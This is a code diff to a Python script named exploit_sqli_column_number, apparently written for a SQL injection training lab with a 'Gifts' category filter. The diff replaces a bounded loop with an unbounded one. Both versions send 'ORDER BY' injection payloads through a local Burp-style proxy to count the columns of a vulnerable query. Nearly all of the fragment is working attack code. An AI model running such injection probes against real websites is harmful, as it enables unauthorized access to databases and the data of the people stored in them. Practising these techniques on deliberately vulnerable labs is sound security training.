@@ -7,13 +7,15 @@ proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
 def exploit_sqli_column_number(url):
     path = "filter?category=Gifts"
-    for i in range(1,5):
-        sql_payload = "'+order+by+%s--" %i
-        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
-        res = r.text
-        if "Internal Server Error" in res:
-            return i - 1
-    return False
+    requestResult = False
+    columnCount = 1
+    while requestResult == False:
+         sql_payload = "'+order+by+%s--" %columnCount
+         r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
+         if(r.ok):
+            columnCount+=1
+         else:
+            return columnCount -1
 
 if __name__ == "__main__":
     try:
